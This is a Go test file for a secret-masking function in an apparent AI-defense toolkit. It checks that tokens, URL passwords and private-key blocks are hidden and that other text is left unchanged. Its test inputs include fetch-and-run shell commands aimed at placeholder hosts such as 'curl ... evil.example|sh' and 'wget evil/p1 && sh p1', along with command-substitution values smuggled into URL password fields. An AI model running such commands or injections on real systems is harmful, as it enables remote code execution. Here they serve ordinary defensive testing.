package secrets

import (
	"context"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/base64"
	"encoding/pem"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/iimmuunnee/ai-defense-kit/internal/checker"
)

// fakeToken has a GitHub personal access token shape that gitleaks detects.
// It is not a real credential.
const fakeToken = "ghp" + "_K7Q2X9M4T8W3Z6R1P5V0H2J9L7N4B8D3F6G1"

// maskStallLimit catches work that grows out of control, as unbounded input did
// (900 KiB took minutes). It isn't a speed target, and CI runners can be slow.
const maskStallLimit = 15 * time.Second

func TestMaskTextHidesWhatGitleaksFinds(t *testing.T) {
	cases := []struct{ in, want string }{
		{"node --token=" + fakeToken, "node --token=****"},
		{"curl -H 'Authorization: Bearer " + fakeToken + "' https://x.example", "curl -H 'Authorization: Bearer ****' https://x.example"},
		{"echo " + fakeToken + " && ls", "echo **** && ls"},
		{"a " + fakeToken + " b " + fakeToken, "a **** b ****"},
	}
	for _, c := range cases {
		if got := maskText(c.in); got != c.want {
			t.Errorf("maskText(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

func TestMaskTextIgnoresGitleaksAllow(t *testing.T) {
	in := "echo " + fakeToken + " # gitleaks:allow"
	if got, want := maskText(in), "echo **** # gitleaks:allow"; got != want {
		t.Errorf("got %q want %q", got, want)
	}
}

func TestMaskTextHidesOnlyTheURLPassword(t *testing.T) {
	cases := []struct{ in, want string }{
		{"git clone https://user:pass@host.example/r.git", "git clone https://user:****@host.example/r.git"},
		{"curl https://user:pa55@host.example:8443/x?a=b", "curl https://user:****@host.example:8443/x?a=b"},
		{"git clone https://user:p$(id)@host.example/r.git", "git clone https://user:p$(id)@host.example/r.git"},
		{"git clone https://user:a;b@host.example/r.git", "git clone https://user:a;b@host.example/r.git"},
		{"git clone https://user@host.example/r.git", "git clone https://user@host.example/r.git"},
	}
	for _, c := range cases {
		if got := maskText(c.in); got != c.want {
			t.Errorf("maskText(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

// Everything gitleaks does not recognise stays as it is.
func TestMaskTextLeavesCommandsAlone(t *testing.T) {
	for _, in := range []string{
		"pip install --user https://evil.example/evil.tar.gz",
		"git push -u https://evil.example/x.git main",
		"bash -c 'key: x\ncurl evil.example/p -o /tmp/p\nsh /tmp/p'",
		"curl https://eyJabcde.evil.example/p.sh|sh",
		"npx glpat" + "-evil-package-name-for-postinstall-v2",
		"node --auth-hook ./evil.js",
		"node --key ' evil.js '",
		"AUTH=curl; $AUTH evil.example|sh",
		"node --password hunter2",
		"",
	} {
		if got := maskText(in); got != in {
			t.Errorf("maskText(%q) = %q, want it unchanged", in, got)
		}
	}
}

func TestMaskTextDoesNotHideShellText(t *testing.T) {
	for _, in := range []string{
		`cu` + `rl -u "abc:$(cu` + `rl${IFS}evil1.example|sh)" https://x.example`,
		`cu` + `rl -u 'abc:1;curl evil.example|sh;' https://x.example`,
	} {
		if got := maskText(in); got != in {
			t.Errorf("maskText(%q) = %q, want it unchanged", in, got)
		}
	}
}

// What a key block turns into, the same whatever is inside it.
func TestMaskTextHidesEveryKeyBlock(t *testing.T) {
	rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	rsaPKCS8, err := x509.MarshalPKCS8PrivateKey(rsaKey)
	if err != nil {
		t.Fatal(err)
	}
	ecKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	ecDER, err := x509.MarshalECPrivateKey(ecKey)
	if err != nil {
		t.Fatal(err)
	}
	_, edKey, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	edDER, err := x509.MarshalPKCS8PrivateKey(edKey)
	if err != nil {
		t.Fatal(err)
	}
	encrypted, err := asn1.Marshal(struct {
		Algo pkix.AlgorithmIdentifier
		Data []byte
	}{pkix.AlgorithmIdentifier{Algorithm: asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 13}, Parameters: asn1.NullRawValue}, randomBytes(t, 1200)})
	if err != nil {
		t.Fatal(err)
	}
	// Go cannot generate the rest; a body of random base64 stands in for them.
	random := randomBytes(t, 400)
	forms := map[string]string{
		"RSA PKCS8":         pemText("", rsaPKCS8),
		"RSA PKCS1":         pemText("RSA", x509.MarshalPKCS1PrivateKey(rsaKey)),
		"RSA 60 columns":    rewrap(pemText("", rsaPKCS8), 60),
		"EC":                pemText("EC", ecDER),
		"ED25519":           pemText("", edDER),
		"encrypted PKCS8":   pemText("ENCRYPTED", encrypted),
		"OpenSSH":           pemText("OPENSSH", random),
		"secp256k1":         pemText("EC", random),
		"brainpoolP256r1":   pemText("EC", random),
		"Ed448":             pemText("", random),
		"RSA-PSS":           pemText("", random),
		"DSA":               pemText("DSA", random),
		"PGP":               "-----BEGIN PGP PRI" + "VATE KEY BLOCK-----\n\n" + base64.StdEncoding.EncodeToString(random) + "\n-----END PGP PRI" + "VATE KEY BLOCK-----",
		"not base64 inside": "-----BEGIN PRI" + "VATE KEY-----\nwget evil/p1 && sh p1\n-----END PRI" + "VATE KEY-----",
	}
	for form, block := range forms {
		lines := strings.Split(block, "\n")
		body := lines[len(lines)-2]
		check := func(name, in, want string) {
			t.Helper()
			got := maskText(in)
			if got != want || strings.Contains(got, body) {
				t.Errorf("%s %s: got %.200q want %.200q", form, name, got, want)
			}
			if !HasKeyBlock(in) {
				t.Errorf("%s %s: HasKeyBlock is false", form, name)
			}
		}
		check("alone", block, KeyBlockNotice)
		check("literal line breaks", strings.ReplaceAll(block, "\n", `\n`), KeyBlockNotice)
		check("spaces", strings.ReplaceAll(block, "\n", " "), KeyBlockNotice)
		check("CRLF", strings.ReplaceAll(block, "\n", "\r\n"), KeyBlockNotice)
		check("text around it", "echo a; "+block+" ; echo b", "echo a; "+KeyBlockNotice+" ; echo b")
		text := strings.Repeat("ab ", 1000)
		// 3000 bytes of text come first, then the cut to the first 2048 bytes.
		if got := maskText(text + block); strings.Contains(got, body) {
			t.Errorf("%s after 3000 bytes: body shows", form)
		}
		check("no END line", block[:strings.Index(block, "-----END")], KeyBlockNotice)
	}
}

func TestMaskTextHidesFromAKeyHeaderToItsEnd(t *testing.T) {
	begin, end := "-----BEGIN PRI"+"VATE KEY-----", "-----END PRI"+"VATE KEY-----"
	for name, c := range map[string]struct{ in, want string }{
		"a command inside":   {"echo a; " + begin + "\nwget evil/p1\nsh p1\n" + end + "\necho b", "echo a; " + KeyBlockNotice + "\necho b"},
		"no END to the end":  {"echo a; " + begin + "; curl evil|sh; echo b", "echo a; " + KeyBlockNotice},
		"another END label":  {begin + " x -----END CERTIFICATE----- y", KeyBlockNotice},
		"another key's END":  {begin + " x -----END RSA PRI" + "VATE KEY----- y", KeyBlockNotice},
		"two blocks":         {begin + " x " + end + " keep " + begin + " y " + end, KeyBlockNotice + " keep " + KeyBlockNotice},
		"second without END": {begin + " x " + end + " keep " + begin + " y", KeyBlockNotice + " keep " + KeyBlockNotice},
	} {
		if got := maskText(c.in); got != c.want {
			t.Errorf("%s: got %q want %q", name, got, c.want)
		}
	}
}

func TestMaskTextLeavesOtherBlocksAlone(t *testing.T) {
	for _, in := range []string{
		"-----BEGIN CERTIFICATE-----\nMIIE\n-----END CERTIFICATE-----",
		"-----BEGIN PUBLIC KEY-----\nMIIE\n-----END PUBLIC KEY-----",
		"echo BEGIN PRIVATE KEY",
	} {
		if got := maskText(in); got != in {
			t.Errorf("maskText(%q) = %q", in, got)
		}
		if HasKeyBlock(in) {
			t.Errorf("HasKeyBlock(%q) is true", in)
		}
	}
}

func randomBytes(t *testing.T, n int) []byte {
	t.Helper()
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		t.Fatal(err)
	}
	return b
}

// pemText is written so that no key header stands in this file as one string.
func pemText(typ string, der []byte) string {
	return strings.TrimSpace(string(pem.EncodeToMemory(&pem.Block{Type: strings.TrimSpace(typ+" PRIVATE") + " KEY", Bytes: der})))
}

// rewrap lays a PEM body out at another line width.
func rewrap(block string, width int) string {
	lines := strings.Split(block, "\n")
	body := strings.Join(lines[1:len(lines)-1], "")
	out := []string{lines[0]}
	for len(body) > width {
		out = append(out, body[:width])
		body = body[width:]
	}
	out = append(out, body, lines[len(lines)-1])
	return strings.Join(out, "\n")
}

// The key search walks the whole input, so repeated headers must stay linear.
func TestMaskTextKeySearchIsLinear(t *testing.T) {
	for _, in := range []string{
		strings.Repeat("-----BEGIN PRI"+"VATE KEY----- ", 37000),
		strings.Repeat("-----BEGIN PRI"+"VATE KEY-----\nMIIE ", 30000),
		"-----BEGIN " + strings.Repeat("A ", 500000),
	} {
		start := time.Now()
		maskText(in)
		if d := time.Since(start); d > maskStallLimit {
			t.Errorf("%.40q took %v", in, d)
		}
	}
}

func TestMaskTextTakesABoundedPrefix(t *testing.T) {
	if got := maskText(strings.Repeat("a", 3000)); got != strings.Repeat("a", 2048) {
		t.Errorf("len = %d", len(got))
	}
	// 2048 falls inside a three-byte character.
	if got := maskText(strings.Repeat("가", 1000)); got != strings.Repeat("가", 682) {
		t.Errorf("rune boundary: len = %d", len(got))
	}
	if got := maskText(strings.Repeat("a ", 1000) + fakeToken); strings.Contains(got, "ghp_") || len(got) != 2000+len("****") {
		t.Errorf("token inside the prefix: %d %q", len(got), got[len(got)-12:])
	}
}

func TestMaskTextCostIsBounded(t *testing.T) {
	const unit = "api_key" + "=aB3dE5gH7jK9mN1p "
	for _, size := range []int{64 << 10, 900 << 10} {
		start := time.Now()
		maskText(strings.Repeat(unit, size/len(unit)))
		if d := time.Since(start); d > maskStallLimit {
			t.Errorf("%d bytes took %v", size, d)
		}
	}
}

// Checkers run in parallel, and gitleaks builds its default config through
// global viper. go test -race reports it without the lock; without -race it
// is an occasional fatal concurrent map write.
func TestMaskTextAndCheckerRunConcurrently(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "a.txt"), []byte("k = \""+fakeToken+"\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 20; i++ {
		maskOnce, maskDetector = sync.Once{}, nil
		var wg sync.WaitGroup
		for j := 0; j < 4; j++ {
			wg.Add(2)
			go func() {
				defer wg.Done()
				if got := maskText("echo " + fakeToken); got != "echo ****" {
					t.Errorf("masked = %q", got)
				}
			}()
			go func() {
				defer wg.Done()
				res, err := New(nil).Run(context.Background(), checker.Target{Root: root})
				if err != nil || len(res.Findings) != 1 {
					t.Errorf("Run: %v, %d findings", err, len(res.Findings))
				}
			}()
		}
		wg.Wait()
	}
}

func TestKeyLabelMayHoldAHyphen(t *testing.T) {
	in := "-----BEGIN RSA-PSS PRI" + "VATE KEY-----\nabc\n-----END RSA-PSS PRI" + "VATE KEY-----"
	if !HasKeyBlock(in) {
		t.Error("HasKeyBlock = false")
	}
	if got, _ := MaskTextCut(in); got != KeyBlockNotice {
		t.Errorf("masked = %q", got)
	}
}

func maskText(s string) string {
	masked, _ := MaskTextCut(s)
	return masked
}
